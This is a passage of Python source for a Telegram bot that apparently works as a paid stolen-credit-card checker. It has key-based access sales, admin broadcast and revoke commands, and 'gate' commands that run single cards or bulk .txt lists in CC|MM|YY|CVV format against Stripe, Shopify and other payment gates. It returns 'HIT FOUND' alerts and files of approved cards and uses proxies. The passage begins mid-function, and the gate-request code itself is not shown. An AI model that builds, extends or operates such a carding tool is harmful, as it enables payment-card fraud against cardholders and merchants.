        generated = []
        for _ in range(count):
            key = generate_key()
            keys[key] = {
                "created_by": user_id,
                "created_at": time.time(),
                "used": False,
                "duration": duration_seconds,
                "line_limit": line_limit,
            }
            generated.append(key)
        save_keys(keys)

        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        limit_label = str(line_limit) if line_limit else "Unlimited"

        filename = f"keys_{count}x_{int(time.time())}.txt"
        filepath = os.path.join(DATA_DIR, filename)
        with open(filepath, "w") as f:
            for k in generated:
                f.write(k + "\n")
        send_document(chat_id, filepath, filename,
            caption=f"<b>{count} Keys Generated</b>\nDuration: <code>{dur_label}</code>\nLine Limit: <code>{limit_label}</code>{FOOTER}")
        return

    # --- /revoke <user_id> (admin) ---
    if text.startswith("/revoke"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> <code>/revoke 123456789</code>" + FOOTER)
            return
        target_id = parts[1].strip()
        users = load_users()
        if target_id in users:
            del users[target_id]
            save_users(users)
            send_message(chat_id, f"<b>Access Revoked</b>\n\nUser <code>{target_id}</code> has been removed." + FOOTER)
        else:
            send_message(chat_id, f"<b>User not found.</b>\n\n<code>{target_id}</code> is not authorized." + FOOTER)
        return

    # --- /authlist (admin) ---
    if text == "/authlist":
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
            return
        users = load_users()
        if not users:
            send_message(chat_id, "<b>No authorized users.</b>" + FOOTER)
            return

        lines_out = []
        now = time.time()
        for uid, entry in users.items():
            key = entry.get("key", "N/A")
            expires_at = entry.get("expires_at")
            if expires_at is None:
                exp = "Permanent"
            elif now > expires_at:
                exp = "EXPIRED"
            else:
                remaining = int(expires_at - now)
                exp = fmt_duration(remaining) + " left"
            lines_out.append(f"  {uid} | {key[:10]}... | {exp}")

        msg_text = (
            f"<b>Authorized Users ({len(users)})</b>\n"
            f"{'─' * 28}\n\n"
            "<code>" + "\n".join(lines_out) + "</code>"
            + FOOTER
        )
        send_message(chat_id, msg_text)
        return

    # --- /broadcast (admin) ---
    if text.startswith("/broadcast"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> /broadcast Your message here" + FOOTER)
            return
        broadcast_text = parts[1]
        users = load_users()
        sent = 0
        failed = 0
        for uid in users:
            try:
                resp = send_message(int(uid), f"<b>Broadcast</b>\n\n{broadcast_text}{FOOTER}")
                if resp.get("ok"):
                    sent += 1
                else:
                    failed += 1
            except Exception:
                failed += 1
        send_message(chat_id, f"<b>Broadcast Complete</b>\n\nSent: <code>{sent}</code>\nFailed: <code>{failed}</code>{FOOTER}")
        return

    # --- /redeem ---
    if text.startswith("/redeem"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> <code>/redeem YOUR-KEY</code>" + FOOTER)
            return
        key = parts[1].strip()
        keys = load_keys()
        if key not in keys:
            send_message(chat_id, "<b>Invalid key.</b>" + FOOTER)
            return
        if keys[key].get("used"):
            send_message(chat_id, "<b>Key already used.</b>" + FOOTER)
            return
        keys[key]["used"] = True
        keys[key]["used_by"] = user_id
        save_keys(keys)

        duration_seconds = keys[key].get("duration")
        line_limit = keys[key].get("line_limit")
        authorize_user(user_id, key, duration_seconds, line_limit)

        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        limit_label = str(line_limit) if line_limit else "Unlimited"
        send_message(chat_id, f"<b>Access Granted</b>\n\nDuration: <code>{dur_label}</code>\nLine Limit: <code>{limit_label}</code>\nWelcome aboard.{FOOTER}")
        return

    # --- Gate commands: /auth, /st1, /st5 (single card OR bulk file) ---
    gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/autosho": ("autosho", "Shopify Auto"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check")}
    cmd_base = text.split()[0] if text else ""
    if cmd_base in gate_map:
        gate, gate_label = gate_map[cmd_base]

        # Check if gate is disabled
        if not is_gate_enabled(gate):
            send_message(chat_id,
                f"<b>⛔ {gate_label} — Offline</b>\n\n"
                f"This gate has been disabled by an admin.\n"
                f"Try another gate or check /gates for available options." + FOOTER)
            return

        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return

        # --- SINGLE CARD MODE: /auth 4111...|01|25|123 ---
        parts = text.split(maxsplit=1)
        if len(parts) == 2 and '|' in parts[1]:
            cc_input = parts[1].strip()
            c_data = cc_input.split('|')
            if len(c_data) != 4:
                send_message(chat_id, "<b>Invalid format.</b>\n\nUse: <code>/auth CC|MM|YY|CVV</code>" + FOOTER)
                return

            send_message(chat_id, f"<b>🔍 Checking...</b>\n<code>{cc_input}</code>")

            def _single_check():
                result = process_single_entry(cc_input, [], user_id, gate=gate)
                r_lower = result.lower()
                if r_lower.startswith("approved") or r_lower.startswith("charged"):
                    icon = "✅"
                    status = "APPROVED"
                elif "skipped" in r_lower:
                    icon = "⏭️"
                    status = "SKIPPED"
                elif "error" in r_lower or "⚠️" in result:
                    icon = "⚠️"
                    status = "ERROR"
                else:
                    icon = "❌"
                    status = "DECLINED"

                send_message(chat_id,
                    f"<b>{icon} {status}</b>\n"
                    f"{'─' * 28}\n\n"
                    f"Card: <code>{cc_input}</code>\n"
                    f"Gate: <code>{gate_label}</code>\n"
                    f"Result: {result}"
                    + FOOTER)

            threading.Thread(target=_single_check, daemon=True).start()
            return

        # --- BULK MODE: reply to .txt file ---
        reply = msg.get("reply_to_message")
        if not reply or not reply.get("document"):
            send_message(chat_id,
                f"<b>Usage:</b>\n"
                f"  Single: <code>{cmd_base} CC|MM|YY|CVV</code>\n"
                f"  Bulk: Reply to a .txt file with <code>{cmd_base}</code>" + FOOTER)
            return

        doc = reply["document"]
        fname = doc.get("file_name", "")
        if not fname.lower().endswith(".txt"):
            send_message(chat_id, "<b>Only .txt files are accepted.</b>" + FOOTER)
            return

        with active_lock:
            if user_id in active_users:
                send_message(chat_id, "<b>You already have a task running.</b>" + FOOTER)
                return
            active_users.add(user_id)

        cancel_flags.pop(user_id, None)

        content = download_file(doc["file_id"])
        if not content:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, "<b>Failed to download file.</b>" + FOOTER)
            return

        lines = [l.strip() for l in content.splitlines() if l.strip()]
        if not lines:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, "<b>File is empty.</b>" + FOOTER)
            return

        # Enforce line limit from key
        user_limit = get_user_line_limit(user_id)
        if user_limit and len(lines) > user_limit:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, f"<b>File Too Large</b>\n\nYour key allows <code>{user_limit}</code> lines.\nYour file has <code>{len(lines)}</code> lines." + FOOTER)
            return

        init_resp = send_message(
            chat_id,
            f"Starting Engine — <b>{gate_label}</b>...",
            reply_markup=stop_button_markup(user_id)
        )
        progress_msg_id = init_resp.get("result", {}).get("message_id")

        def _run(gate=gate):
            start_time = time.time()
            last_edit_time = [0]

            def on_progress(idx, total, results, entry, status, detail):
                if status == "APPROVED":
                    status_text = "APPROVED — " + detail
                elif status == "DECLINED":
                    status_text = "DECLINED — " + detail
                elif status == "SKIPPED":
                    status_text = "SKIPPED — " + detail
                else:
                    status_text = "ERROR — " + detail

                # Instant hit notification — send immediately on approval
                if status == "APPROVED":
                    send_message(
                        chat_id,
                        f"<b>HIT FOUND</b>\n"
                        f"{'─' * 28}\n\n"
                        f"<code>{entry}</code>\n\n"
                        f"{detail}\n"
                        f"{'─' * 28}\n"
                        f"  [{idx}/{total}]"
                    )

                now = time.time()
                if progress_msg_id and (now - last_edit_time[0] >= 3 or idx == total):
                    last_edit_time[0] = now
                    markup = None if idx == total else stop_button_markup(user_id)
                    edit_message(
                        chat_id,
                        progress_msg_id,
                        fmt_live(idx, total, results, start_time, entry=entry, status_text=status_text, done=(idx == total)),
                        reply_markup=markup
                    )

            def on_complete(results):
                cancel_flags.pop(user_id, None)
                update_user_stats(user_id, results)
                update_gate_stats(gate, results)

                if progress_msg_id:
                    edit_message(
                        chat_id,
                        progress_msg_id,
                        fmt_live(
                            results['total'], results['total'], results, start_time,
                            entry="Finished", status_text="Completed", done=True
                        )
                    )

                send_message(chat_id, fmt_results(results))

                if results["approved_list"]:
                    filename = f"approved_{int(time.time())}.txt"
                    filepath = os.path.join(DATA_DIR, filename)
                    with open(filepath, "w") as f:
                        for entry in results["approved_list"]:
                            f.write(entry + "\n")
                    send_document(chat_id, filepath)

                with active_lock:
                    active_users.discard(user_id)

            run_processing(lines, user_id, on_progress=on_progress, on_complete=on_complete, gate=gate)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        return


# ============================================================
#  Polling loop
# ============================================================
def main():
    print(f"[Bot] Starting — Made by {DEVELOPER}")
    load_global_proxies()
    print(f"[Bot] Polling for updates...")

    offset = 0
    while True:
        try:
            resp = tg_request("getUpdates", offset=offset, timeout=30)
            updates = resp.get("result", [])
            for upd in updates:
                offset = upd["update_id"] + 1
                try:
                    handle_update(upd)
                except Exception as e:
                    print(f"[Bot] Error handling update: {e}")
        except KeyboardInterrupt:
            print("\n[Bot] Stopped.")
            break
        except Exception as e:
            print(f"[Bot] Polling error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
